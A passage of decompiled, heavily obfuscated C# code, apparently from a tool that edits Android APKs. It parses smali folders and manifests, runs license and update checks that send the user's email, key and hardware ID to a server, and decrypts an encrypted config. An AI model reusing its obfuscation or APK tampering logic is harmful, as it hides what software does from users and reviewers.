        int num1 = 68546825;
        object objectValue1;
        DateTime utcNow;
        string email;
        string str2;
        Dictionary<string, object> dictionary;
        object objectValue2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 - (-1019952605 + -(-2035769680 - -2139925800) + ~-(124787589 * 1971828069) ^ -(-(1652941897 - 1212171380) + (1677882438 * 1774173093 - -380579485))) + 1142736843 * -1123742098 - 1787990391)) % 10U)
          {
            case 0:
              objectValue1 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u003734C0C18]);
              int num3 = !Operators.ConditionalCompareObjectEqual(objectValue2, (object) 200, false) ? 1067024728 : (num3 = 44844598);
              num1 = num3 ^ (int) num2 * -812259806;
              continue;
            case 1:
              utcNow = DateTime.UtcNow;
              num1 = (int) num2 * -1994478842 ^ 1099805111;
              continue;
            case 2:
              email = RegistryHandler.Get_EMAIL();
              num1 = (int) num2 * 1936059082 ^ -133140612;
              continue;
            case 3:
              str2 = Codes.getuserkey();
              num1 = (int) num2 * 377693184 ^ 2083297742;
              continue;
            case 4:
              str1 = EXGuarder.\u0037067155A;
              num1 = (int) num2 * 862567580 ^ 67092279;
              continue;
            case 5:
              goto label_3;
            case 7:
              goto label_1;
            case 8:
              double num4 = Conversion.Int(utcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
              // ISSUE: reference to a compiler-generated method
              string sign = clsComputerInfo._Closure\u0024__.getSign(email + str2 + Conversions.ToString(num4));
              dictionary = JsonConvert.DeserializeObject<Dictionary<string, object>>(Codes.requestApiPost(EXGuarder.\u0033B795A4D + email + EXGuarder.\u003334D4513 + str2 + EXGuarder.\u003334D4513 + Conversions.ToString(num4) + EXGuarder.\u003334D4513 + sign));
              objectValue2 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u0032A596827]);
              num1 = (int) num2 * 1056629640 ^ -1717812849;
              continue;
            case 9:
              num1 = 126492493;
              continue;
            default:
              goto label_17;
          }
        }
label_3:
        str1 = Conversions.ToString(objectValue1);
        goto label_17;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_12:
        int num5 = 385182888;
        while (true)
        {
          uint num6;
          switch ((num6 = (uint) ~(num5 - (-1019952605 + -(-2035769680 - -2139925800) + ~-(124787589 * 1971828069) ^ -(-(1652941897 - 1212171380) + (1677882438 * 1774173093 - -380579485))) + 1142736843 * -1123742098 - 1787990391)) % 4U)
          {
            case 0:
              ProjectData.ClearProjectError();
              num5 = (int) num6 * 1272305057 ^ -711907210;
              continue;
            case 1:
              num5 = (int) num6 * -1351737142 ^ 2134457815;
              continue;
            case 2:
              goto label_12;
            default:
              goto label_16;
          }
        }
      }
label_16:
      str1 = EXGuarder.\u0037067155A;
label_17:
      return str1;
    }

    public static string CheckForUpdates()
    {
      try
      {
        return Codes.ServerMessage(Codes.ReadConfig(EXGuarder.\u00374667408), true, EXGuarder.\u00349543F78 + RegistryHandler.Get_EMAIL() + EXGuarder.\u003194C5909 + Codes.getuserkey() + EXGuarder.\u003410B4818 + (Codes.GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_2:
        int num1 = -1069129440;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~num1 * -1701581917 + -211908929 * (1146268264 - -1222101965 - 932605460) ^ ~611223638 - (552925246 - 403945063))) % 3U)
          {
            case 0:
              goto label_2;
            case 2:
              ProjectData.ClearProjectError();
              num1 = (int) num2 * 974028941 ^ -1626912008;
              continue;
            default:
              goto label_5;
          }
        }
      }
label_5:
      return EXGuarder.\u0032D005464;
    }

    public static string WhatNewupdate()
    {
      string str1;
      try
      {
        string str2 = Codes.ServerMessage(Codes.ReadConfig(EXGuarder.\u0036B1F2D55), true, EXGuarder.\u00370473535 + RegistryHandler.Get_EMAIL() + EXGuarder.\u00375676405 + Codes.getuserkey() + EXGuarder.\u00340203714 + (Codes.GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim());
label_1:
        int num1 = -1029753633;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 - -1703459943 * (1637520348 + (1790261841 - 852763448 - --1281726616) - (1937546147 * 1789491275 + ~-186739182 - (108569273 ^ -1267444496) * 663849977)) - -(-(-1513387922 - 1598733343) + (-31847767 - (115075545 - 787383871))) + -(--713967222 - -1918138738)) * 535200329)) % 5U)
          {
            case 1:
              int num3 = !str2.StartsWith(EXGuarder.\u0031A291C31) ? 1686197488 : (num3 = 2063653978);
              num1 = num3 ^ (int) num2 * -590281227;
              continue;
            case 2:
              goto label_11;
            case 3:
              str1 = str2.Replace(EXGuarder.\u003011F0C5F, EXGuarder.\u00378060A06);
              num1 = (int) num2 * -1525102667 ^ 406158343;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        str1 = EXGuarder.\u0030E16031B;
        goto label_11;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_7:
        int num4 = -938547377;
        while (true)
        {
          uint num5;
          switch ((num5 = (uint) ((num4 - -1703459943 * (1637520348 + (1790261841 - 852763448 - --1281726616) - (1937546147 * 1789491275 + ~-186739182 - (108569273 ^ -1267444496) * 663849977)) - -(-(-1513387922 - 1598733343) + (-31847767 - (115075545 - 787383871))) + -(--713967222 - -1918138738)) * 535200329)) % 3U)
          {
            case 1:
              ProjectData.ClearProjectError();
              num4 = (int) num5 * 1390234620 ^ -869436786;
              continue;
            case 2:
              goto label_7;
            default:
              goto label_10;
          }
        }
      }
label_10:
      str1 = EXGuarder.\u0030E16031B;
label_11:
      return str1;
    }

    public static bool dl()
    {
      string str = Codes.requestApi(EXGuarder.\u0032D771113, EXGuarder.\u003543D4D50);
label_1:
      int num1 = -1589857520;
      TimeSpan timeSpan;
      Dictionary<string, object> dictionary;
      object objectValue1;
      object objectValue2;
      object objectValue3;
      object objectValue4;
      double totalSeconds;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~(num1 + ----1371201854 * 1445801321 ^ ~(-517556162 ^ 219495821) + (331756794 * 81892801 - 446638473) ^ ~(1273875560 + 94396448) ^ ~1451915901 + ~1512244791)) % 17U)
        {
          case 0:
            goto label_1;
          case 1:
            timeSpan = DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1));
            num1 = 1709833085;
            continue;
          case 3:
            objectValue1 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u003610D2D12]);
            num1 = (int) num2 * 1456783752 ^ -1703614784;
            continue;
          case 4:
            int num3 = !Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet((object) null, typeof (Math), EXGuarder.\u0033E3F2871, new object[1]
            {
              Operators.SubtractObject((object) totalSeconds, objectValue1)
            }, (string[]) null, (Type[]) null, (bool[]) null), (object) 60, false) ? -769112184 : (num3 = -1862288219);
            num1 = num3 ^ (int) num2 * -365045398;
            continue;
          case 5:
            Console.WriteLine(EXGuarder.\u0032D6B2A3B);
            flag = true;
            num1 = (int) num2 * 1674391109 ^ 1004425664;
            continue;
          case 6:
            flag = true;
            num1 = (int) num2 * 2071068247 ^ 1753332181;
            continue;
          case 7:
            objectValue2 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u00306317865]);
            num1 = (int) num2 * -1934994128 ^ -1478631353;
            continue;
          case 8:
            objectValue3 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u0035D71515D]);
            objectValue4 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u00355000C09]);
            num1 = (int) num2 * -2004754276 ^ 1280742709;
            continue;
          case 9:
            flag = true;
            num1 = -2061687074;
            continue;
          case 10:
            int num4;
            num1 = num4 = !Operators.ConditionalCompareObjectEqual(objectValue3, (object) 200, false) ? 1740807508 : (num4 = -1469726849);
            continue;
          case 11:
            Console.WriteLine(EXGuarder.\u003455F072F);
            num1 = (int) num2 * -125551143 ^ -84405778;
            continue;
          case 12:
            num1 = (int) num2 * 278882705 ^ -1788065637;
            continue;
          case 13:
            dictionary = JsonConvert.DeserializeObject<Dictionary<string, object>>(str);
            num1 = (int) num2 * 592992917 ^ -2105365027;
            continue;
          case 14:
            totalSeconds = timeSpan.TotalSeconds;
            num1 = (int) num2 * -801051920 ^ 1564275709;
            continue;
          case 15:
            Console.WriteLine(EXGuarder.\u00361133F1C);
            num1 = (int) num2 * -899126644 ^ 1683300040;
            continue;
          case 16:
            // ISSUE: reference to a compiler-generated method
            string sign = clsComputerInfo._Closure\u0024__.getSign(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(objectValue3, dictionary[EXGuarder.\u00366022A67]), dictionary[EXGuarder.\u00308082C38]), objectValue2), objectValue1)));
            int num5 = !Operators.ConditionalCompareObjectNotEqual(objectValue4, (object) sign, false) ? -1235414571 : (num5 = 2073116195);
            num1 = num5 ^ (int) num2 * -1244283434;
            continue;
          default:
            goto label_18;
        }
      }
label_18:
      return flag;
    }

    public static bool IsValidPackageName(string packageName)
    {
      if (!string.IsNullOrWhiteSpace(packageName))
        goto label_16;
label_1:
      int num1 = 1827949045;
label_2:
      bool flag;
      Regex regex;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~((num1 ^ -1590622288 + (2108593313 - 1693508433) ^ 2046756619 + (~-1243980973 - ~1604736534) ^ -(583937526 ^ 1313244863) - (-1824708918 - -1388876022 ^ --456695626) ^ -(~(1255073137 * 1655696360) - (~2073383426 - -1933364335 * -387198893))) - (~(-1261562442 * -309296725) - -(-911583492 * 820780391)))) % 18U)
        {
          case 0:
            flag = false;
            num1 = (int) num2 * 455189139 ^ -540546183;
            continue;
          case 1:
            num1 = (int) num2 * -1623674063 ^ 273240418;
            continue;
          case 2:
            flag = false;
            num1 = (int) num2 * -339696655 ^ 1954368007;
            continue;
          case 3:
            flag = false;
            num1 = 1858006903;
            continue;
          case 4:
            int num3 = packageName.EndsWith(EXGuarder.\u0032C6E0F5C) ? 1567185241 : (num3 = 923524349);
            num1 = num3 ^ (int) num2 * -911244990;
            continue;
          case 5:
            int num4 = regex.IsMatch(packageName) ? -603836244 : (num4 = -364472770);
            num1 = num4 ^ (int) num2 * -1167273246;
            continue;
          case 6:
            int num5;
            num1 = num5 = packageName.Contains(EXGuarder.\u0032C6E0F5C) ? 557537320 : (num5 = 182828684);
            continue;
          case 8:
            goto label_16;
          case 9:
            num1 = (int) num2 * -353513417 ^ -1683815044;
            continue;
          case 10:
            regex = new Regex(EXGuarder.\u0031E29051C);
            num1 = 1987831173;
            continue;
          case 11:
            num1 = (int) num2 * 1182260256 ^ -10191017;
            continue;
          case 12:
            int num6;
            num1 = num6 = packageName.StartsWith(EXGuarder.\u0032C6E0F5C) ? 735594269 : (num6 = 2137270638);
            continue;
          case 13:
            flag = false;
            num1 = (int) num2 * 1042173231 ^ -1670005478;
            continue;
          case 14:
            goto label_1;
          case 15:
            num1 = (int) num2 * 527608537 ^ -160832608;
            continue;
          case 16:
            flag = false;
            num1 = (int) num2 * 387682589 ^ 1537242983;
            continue;
          case 17:
            flag = true;
            num1 = (int) num2 * 1264374085 ^ -1998622312;
            continue;
          default:
            goto label_19;
        }
      }
label_19:
      return flag;
label_16:
      num1 = char.IsLetter(packageName[0]) ? 1254198096 : (num1 = 1729303040);
      goto label_2;
    }

    public static bool CheckPort(int Port)
    {
      IPGlobalProperties globalProperties = IPGlobalProperties.GetIPGlobalProperties();
label_1:
      int num1 = -91691798;
      int index;
      bool flag;
      IPEndPoint[] activeTcpListeners;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(-(-num1 + ~~(-665053224 ^ -1795775214 ^ -697342842) - (2005467209 + ~(-1592705490 ^ 626724950))) * 950701113)) % 9U)
        {
          case 0:
            flag = true;
            num1 = (int) num2 * 1791132673 ^ 1814868917;
            continue;
          case 1:
            int num3;
            num1 = num3 = index < activeTcpListeners.Length ? -1877004284 : (num3 = 781381889);
            continue;
          case 2:
            activeTcpListeners = globalProperties.GetActiveTcpListeners();
            index = 0;
            num1 = (int) num2 * -1934256431 ^ 806748702;
            continue;
          case 3:
            num1 = (int) num2 * 242407321 ^ 2144781106;
            continue;
          case 4:
            flag = false;
            num1 = 983601623;
            continue;
          case 6:
            checked { ++index; }
            num1 = (int) num2 * 1959037134 ^ 1894239748;
            continue;
          case 7:
            goto label_1;
          case 8:
            int num4;
            num1 = num4 = activeTcpListeners[index].Port == Port ? -1686132072 : (num4 = -2136835956);
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return flag;
    }

    public static string ServerMessage(string url, bool ispost = false, string postParams = "")
    {
      string end;
      try
      {
        WebRequest webRequest = WebRequest.Create(url);
label_1:
        int num1 = -309031249;
        byte[] bytes;
        while (true)
        {
          int num2 = num1;
          uint num3;
          string s;
          switch ((num3 = (uint) (1195896245 - ~-(~num2 * 1798128727 + (~~1189701884 + (-1814744157 * -1834607140 - (567668977 + 91410174)))))) % 7U)
          {
            case 1:
              s = postParams;
              num1 = (int) num3 * 2044033221 ^ -293865859;
              continue;
            case 2:
              goto label_1;
            case 3:
              if (ispost)
              {
                num1 = (int) num3 * 322979964 ^ -1597223820;
                continue;
              }
              goto label_16;
            case 4:
              bytes = System.Text.Encoding.UTF8.GetBytes(s);
              webRequest.ContentType = EXGuarder.\u00358230B29;
              num1 = (int) num3 * -1600589680 ^ -1148715122;
              continue;
            case 5:
              webRequest.Method = EXGuarder.\u00337791939;
              num1 = (int) num3 * -37818566 ^ -910261908;
              continue;
            case 6:
              webRequest.Method = EXGuarder.\u003264D703E;
              num1 = (int) num3 * 1751045375 ^ 2096246252;
              continue;
            default:
              goto label_9;
          }
        }
label_9:
        webRequest.ContentLength = (long) bytes.Length;
        Stream requestStream = webRequest.GetRequestStream();
        try
        {
          requestStream.Write(bytes, 0, bytes.Length);
        }
        finally
        {
          if (requestStream != null)
          {
label_12:
            int num4 = -856945306;
            while (true)
            {
              int num5 = num4;
              uint num6;
              switch ((num6 = (uint) (1195896245 - ~-(~num5 * 1798128727 + (~~1189701884 + (-1814744157 * -1834607140 - (567668977 + 91410174)))))) % 3U)
              {
                case 0:
                  goto label_12;
                case 1:
                  requestStream.Dispose();
                  num4 = (int) num6 * -362531803 ^ 702396300;
                  continue;
                default:
                  goto label_15;
              }
            }
          }
label_15:;
        }
label_16:
        Stream responseStream = webRequest.GetResponse().GetResponseStream();
        try
        {
          StreamReader streamReader = new StreamReader(responseStream);
          try
          {
            end = streamReader.ReadToEnd();
            goto label_31;
          }
          finally
          {
            if (streamReader != null)
            {
label_20:
              int num7 = 528941664;
              while (true)
              {
                int num8 = num7;
                uint num9;
                switch ((num9 = (uint) (1195896245 - ~-(~num8 * 1798128727 + (~~1189701884 + (-1814744157 * -1834607140 - (567668977 + 91410174)))))) % 3U)
                {
                  case 0:
                    goto label_20;
                  case 2:
                    streamReader.Dispose();
                    num7 = (int) num9 * 1368843366 ^ 1506606326;
                    continue;
                  default:
                    goto label_23;
                }
              }
            }
label_23:;
          }
        }
        finally
        {
          if (responseStream != null)
          {
label_25:
            int num10 = 1791689535;
            while (true)
            {
              int num11 = num10;
              uint num12;
              switch ((num12 = (uint) (1195896245 - ~-(~num11 * 1798128727 + (~~1189701884 + (-1814744157 * -1834607140 - (567668977 + 91410174)))))) % 3U)
              {
                case 0:
                  goto label_25;
                case 2:
                  responseStream.Dispose();
                  num10 = (int) num12 * 869090660 ^ -1127833934;
                  continue;
                default:
                  goto label_28;
              }
            }
          }
label_28:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      end = EXGuarder.\u0037837624A;
label_31:
      return end;
    }

    public static string ReadConfig(string childName)
    {
      string str;
      try
      {
        string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
label_1:
        int num1 = 1755830700;
        JToken jtoken;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~-~num1 ^ ~-1842858275) * 950703701 - -1263181310)) % 4U)
          {
            case 0:
              goto label_1;
            case 2:
              jtoken = JObject.Parse(Codes.AES_Decrypt(System.IO.File.ReadAllText(baseDirectory + EXGuarder.\u0035E6E2F52), EXGuarder.\u0034106252A))[EXGuarder.\u003642B3979];
              num1 = (int) num2 * 1810263752 ^ 498893451;
              continue;
            case 3:
              str = jtoken[(object) childName].ToString();
              num1 = (int) num2 * 2092318263 ^ 716054996;
              continue;
            default:
              goto label_7;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      str = EXGuarder.\u0036F0E371D;
label_7:
      return str;
    }

    public static int nearstmulti(int v, int n)
    {
      return checked ((int) Math.Round(unchecked (Math.Round((double) v / (double) n) * (double) n)));
    }

    public static Bitmap ReadBitmapFromFile(string s_Path)
    {
      Bitmap bitmap;
      try
      {
        FileStream fileStream = new FileStream(s_Path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
        try
        {
          Bitmap original = new Bitmap((Stream) fileStream);
          try
          {
            bitmap = new Bitmap((Image) original);
          }
          finally
          {
            if (original != null)
            {
label_4:
              int num1 = 1850411609;
              while (true)
              {
                int num2 = num1;
                uint num3;
                switch ((num3 = (uint) (285689154 - (num2 - ~(556580289 - ~838841455) - -959795961 * -(1958861715 * 34189680)))) % 3U)
                {
                  case 0:
                    goto label_4;
                  case 2:
                    original.Dispose();
                    num1 = (int) num3 * 1309740452 ^ -1200996367;
                    continue;
                  default:
                    goto label_7;
                }
              }
            }
label_7:;
          }
        }
        finally
        {
          if (fileStream != null)
          {
label_9:
            int num4 = 1862549717;
            while (true)
            {
              int num5 = num4;
              uint num6;
              switch ((num6 = (uint) (285689154 - (num5 - ~(556580289 - ~838841455) - -959795961 * -(1958861715 * 34189680)))) % 3U)
              {
                case 0:
                  goto label_9;
                case 2:
                  fileStream.Dispose();
                  num4 = (int) num6 * 1277532150 ^ 191523796;
                  continue;
                default:
                  goto label_12;
              }
            }
          }
label_12:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_14:
        int num7 = -1438432187;
        while (true)
        {
          int num8 = num7;
          uint num9;
          switch ((num9 = (uint) (285689154 - (num8 - ~(556580289 - ~838841455) - -959795961 * -(1958861715 * 34189680)))) % 4U)
          {
            case 0:
              goto label_14;
            case 1:
              ProjectData.ClearProjectError();
              num7 = (int) num9 * 2106576787 ^ 65172333;
              continue;
            case 3:
              bitmap = new Bitmap(4, 4);
              num7 = (int) num9 * 1359534261 ^ -167281716;
              continue;
            default:
              goto label_18;
          }
        }
      }
label_18:
      return bitmap;
    }

    public static string GetDriv()
    {
      string driv;
      try
      {
        string[] separator = new string[1]
        {
          EXGuarder.\u0030C354139
        };
label_1:
        int num1 = -218377261;
        string[] strArray;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~-~num1 + (807733156 - -1959867182 + ~-401831437) ^ -1004010324)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              strArray = Application.StartupPath.Split(separator, StringSplitOptions.RemoveEmptyEntries);
              num1 = (int) num2 * -360238801 ^ -460343495;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        driv = strArray[0].ToString() + EXGuarder.\u0030C354139;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_6:
        int num3 = -1019336437;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (~-~num3 + (807733156 - -1959867182 + ~-401831437) ^ -1004010324)) % 3U)
          {
            case 0:
              goto label_6;
            case 1:
              driv = EXGuarder.\u00367625F16;
              num3 = (int) num4 * -249220794 ^ 1835206384;
              continue;
            default:
              goto label_9;
          }
        }
label_9:
        ProjectData.ClearProjectError();
      }
      return driv;
    }

    public static string hashmd5(string file_name)
    {
      MD5 md5 = MD5.Create();
      byte[] hash;
      try
      {
        FileStream inputStream = System.IO.File.OpenRead(file_name);
        try
        {
          inputStream.Position = 0L;
label_3:
          int num1 = 227961453;
          while (true)
          {
            int num2 = num1;
            uint num3;
            switch ((num3 = (uint) ((-(106770749 * (-1121472422 * 1977736373)) + ~~-745244522 - ~num2 - (~(1175965725 * 50935119) + ~832223995) ^ (2031503497 - 1272022694) * 35986339) + (1762373028 - 1870407414) - -751993500)) % 3U)
            {
              case 0:
                goto label_3;
              case 2:
                hash = md5.ComputeHash((Stream) inputStream);
                num1 = (int) num3 * 629619 ^ -797300451;
                continue;
              default:
                goto label_16;
            }
          }
        }
        finally
        {
          if (inputStream != null)
          {
label_7:
            int num4 = -847196609;
            while (true)
            {
              int num5 = num4;
              uint num6;
              switch ((num6 = (uint) ((-(106770749 * (-1121472422 * 1977736373)) + ~~-745244522 - ~num5 - (~(1175965725 * 50935119) + ~832223995) ^ (2031503497 - 1272022694) * 35986339) + (1762373028 - 1870407414) - -751993500)) % 3U)
              {
                case 0:
                  goto label_7;
                case 2:
                  inputStream.Dispose();
                  num4 = (int) num6 * 1626176633 ^ 322960453;
                  continue;
                default:
                  goto label_10;
              }
            }
          }
label_10:;
        }
      }
      finally
      {
        if (md5 != null)
        {
label_12:
          int num7 = 481236257;
          while (true)
          {
            int num8 = num7;
            uint num9;
            switch ((num9 = (uint) ((-(106770749 * (-1121472422 * 1977736373)) + ~~-745244522 - ~num8 - (~(1175965725 * 50935119) + ~832223995) ^ (2031503497 - 1272022694) * 35986339) + (1762373028 - 1870407414) - -751993500)) % 3U)
            {
              case 0:
                goto label_12;
              case 1:
                ((IDisposable) md5).Dispose();
                num7 = (int) num9 * -41404520 ^ 263591331;
                continue;
              default:
                goto label_15;
            }
          }
        }
label_15:;
      }
label_16:
      object objectValue = RuntimeHelpers.GetObjectValue(Codes.ComputeHash(hash));
label_17:
      int num10 = 2114379665;
      string str;
      while (true)
      {
        int num11 = num10;
        uint num12;
        switch ((num12 = (uint) ((-(106770749 * (-1121472422 * 1977736373)) + ~~-745244522 - ~num11 - (~(1175965725 * 50935119) + ~832223995) ^ (2031503497 - 1272022694) * 35986339) + (1762373028 - 1870407414) - -751993500)) % 3U)
        {
          case 0:
            goto label_17;
          case 1:
            str = Conversions.ToString(objectValue);
            num10 = (int) num12 * 1658636484 ^ 239237207;
            continue;
          default:
            goto label_20;
        }
      }
label_20:
      return str;
    }

    public static string FindActivityInSmali(
      string TheApkPath,
      string activityName,
      string smaliFolderPath)
    {
      string str = activityName.Replace('.', '/');
      string path = TheApkPath + EXGuarder.\u0034D49392C + smaliFolderPath + EXGuarder.\u0034D49392C + str + EXGuarder.\u00313114174;
label_1:
      int num1 = 874146697;
      string activityInSmali;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (1885081011 - ((num2 - (1176129631 * (~(1649672993 - -617367964) ^ ~-556223914) ^ ~(--1202020699 ^ --1112080002) - 1335377417)) * 1810110335 * -1960062229 * 2110597565 - (-321097292 - -1506051628)))) % 5U)
        {
          case 1:
            int num4 = !System.IO.File.Exists(path) ? 62702835 : (num4 = -2099961588);
            num1 = num4 ^ (int) num3 * -1523434812;
            continue;
          case 2:
            activityInSmali = EXGuarder.\u003462A152B;
            num1 = 1650808756;
            continue;
          case 3:
            goto label_1;
          case 4:
            activityInSmali = path;
            num1 = (int) num3 * 850077025 ^ -1788680541;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return activityInSmali;
    }

    public static bool FileInUse(string sFile)
    {
      bool flag = false;
      if (System.IO.File.Exists(sFile))
      {
        try
        {
          FileStream fileStream = new FileStream(sFile, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
          try
          {
          }
          finally
          {
            if (fileStream != null)
            {
label_4:
              int num1 = -544547499;
              while (true)
              {
                int num2 = num1;
                uint num3;
                switch ((num3 = (uint) ((-1904286627 * 781037483 * -882105893 ^ -(2113691996 ^ 1511928201)) - ~(num2 - (~1844905423 ^ -18984895 * ~~--430906675)))) % 3U)
                {
                  case 0:
                    goto label_4;
                  case 2:
                    fileStream.Dispose();
                    num1 = (int) num3 * 915313274 ^ -1459305659;
                    continue;
                  default:
                    goto label_7;
                }
              }
            }
label_7:;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          flag = true;
label_9:
          int num4 = -876558618;
          while (true)
          {
            int num5 = num4;
            uint num6;
            switch ((num6 = (uint) ((-1904286627 * 781037483 * -882105893 ^ -(2113691996 ^ 1511928201)) - ~(num5 - (~1844905423 ^ -18984895 * ~~--430906675)))) % 3U)
            {
              case 0:
                goto label_9;
              case 2:
                ProjectData.ClearProjectError();
                num4 = (int) num6 * 1479965426 ^ 288096597;
                continue;
              default:
                goto label_12;
            }
          }
        }
      }
label_12:
      return flag;
    }

    public static List<string> GetActivityNames(string manifestPath, bool OnlyMain)
    {
      List<string> stringList = new List<string>();
label_1:
      int num1 = -396738054;
      XmlDocument xmlDocument;
      XmlNamespaceManager nsmgr;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-((num1 ^ -2072471679 * (115870077 + (981055692 * 289508403 - 343718303 - ~~37604023))) * 1296123155) * 814327577 ^ 161473923 * 1351988882 ^ 1917485947)) % 5U)
        {
          case 0:
            xmlDocument.Load(manifestPath);
            num1 = (int) num2 * -204707599 ^ -1370194065;
            continue;
          case 1:
            xmlDocument = new XmlDocument();
            num1 = (int) num2 * 583394782 ^ -1452048928;
            continue;
          case 3:
            nsmgr = new XmlNamespaceManager(xmlDocument.NameTable);
            nsmgr.AddNamespace(EXGuarder.\u0032D505E3C, EXGuarder.\u0035E205C6E);
            num1 = (int) num2 * -1253009024 ^ 117838892;
            continue;
          case 4:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_6:
      XmlNodeList xmlNodeList1 = xmlDocument.SelectNodes(EXGuarder.\u0033F050915, nsmgr);
      IEnumerator enumerator1;
      try
      {
        enumerator1 = xmlNodeList1.GetEnumerator();
label_11:
        int num3 = enumerator1.MoveNext() ? 595369665 : (num3 = -1990039977);
        XmlNode current;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (-((num3 ^ -2072471679 * (115870077 + (981055692 * 289508403 - 343718303 - ~~37604023))) * 1296123155) * 814327577 ^ 161473923 * 1351988882 ^ 1917485947)) % 5U)
          {
            case 0:
              stringList.Add(current.Value);
              num3 = (int) num4 * -2145820303 ^ 300103679;
              continue;
            case 1:
              goto label_11;
            case 2:
              num3 = 595369665;
              continue;
            case 3:
              current = (XmlNode) enumerator1.Current;
              Console.WriteLine(current.Value);
              num3 = 1293303296;
              continue;
            default:
              goto label_18;
          }
        }
      }
      finally
      {
        if (enumerator1 is IDisposable)
        {
label_14:
          int num5 = -1078055695;
          while (true)
          {
            uint num6;
            switch ((num6 = (uint) (-((num5 ^ -2072471679 * (115870077 + (981055692 * 289508403 - 343718303 - ~~37604023))) * 1296123155) * 814327577 ^ 161473923 * 1351988882 ^ 1917485947)) % 3U)
            {
              case 1:
                (enumerator1 as IDisposable).Dispose();
                num5 = (int) num6 * 421934729 ^ 1753101232;
                continue;
              case 2:
                goto label_14;
              default:
                goto label_17;
            }
          }
        }
label_17:;
      }
label_18:
      List<string> activityNames;
      if (OnlyMain)
      {
label_19:
        int num7 = -123292620;
        while (true)
        {
          uint num8;
          switch ((num8 = (uint) (-((num7 ^ -2072471679 * (115870077 + (981055692 * 289508403 - 343718303 - ~~37604023))) * 1296123155) * 814327577 ^ 161473923 * 1351988882 ^ 1917485947)) % 6U)
          {
            case 0:
              goto label_43;
            case 2:
              activityNames = stringList;
              num7 = (int) num8 * 1008666553 ^ -1857568828;
              continue;
            case 3:
              goto label_19;
            case 4:
              int num9 = stringList.Count <= 0 ? -58382757 : (num9 = 1634770982);
              num7 = num9 ^ (int) num8 * -2058846539;
              continue;
            case 5:
              int num10 = (int) Interaction.MsgBox((object) EXGuarder.\u0032F190E16);
              num7 = 1571650765;
              continue;
            default:
              goto label_24;
          }
        }
      }
label_24:
      XmlNodeList xmlNodeList2 = xmlDocument.SelectNodes(EXGuarder.\u003640B245C, nsmgr);
      IEnumerator enumerator2;
      try
      {
        enumerator2 = xmlNodeList2.GetEnumerator();
label_26:
        int num11 = 1261074006;
        XmlNode current;
        while (true)
        {
          uint num12;
          switch ((num12 = (uint) (-((num11 ^ -2072471679 * (115870077 + (981055692 * 289508403 - 343718303 - ~~37604023))) * 1296123155) * 814327577 ^ 161473923 * 1351988882 ^ 1917485947)) % 6U)
          {
            case 0:
              goto label_26;
            case 1:
              current = (XmlNode) enumerator2.Current;
              num11 = 1657428005;
              continue;
            case 2:
              num11 = (int) num12 * -254308646 ^ -1345452361;
              continue;
            case 3:
              stringList.Add(current.Value);
              num11 = (int) num12 * 2072976248 ^ 546301703;
              continue;
            case 5:
              int num13;
              num11 = num13 = enumerator2.MoveNext() ? 73296207 : (num13 = -2113800952);
              continue;
            default:
              goto label_37;
          }
        }
      }
      finally
      {
        if (enumerator2 is IDisposable)
        {
label_33:
          int num14 = -2130516979;
          while (true)
          {
            uint num15;
            switch ((num15 = (uint) (-((num14 ^ -2072471679 * (115870077 + (981055692 * 289508403 - 343718303 - ~~37604023))) * 1296123155) * 814327577 ^ 161473923 * 1351988882 ^ 1917485947)) % 3U)
            {
              case 0:
                goto label_33;
              case 1:
                (enumerator2 as IDisposable).Dispose();
                num14 = (int) num15 * -1725612879 ^ 2044324972;
                continue;
              default:
                goto label_36;
            }
          }
        }
label_36:;
      }
label_37:
      if (stringList.Count <= 0)
        goto label_42;
label_38:
      int num16 = -1666747242;
label_39:
      while (true)
      {
        uint num17;
        switch ((num17 = (uint) (-((num16 ^ -2072471679 * (115870077 + (981055692 * 289508403 - 343718303 - ~~37604023))) * 1296123155) * 814327577 ^ 161473923 * 1351988882 ^ 1917485947)) % 5U)
        {
          case 0:
            goto label_38;
          case 2:
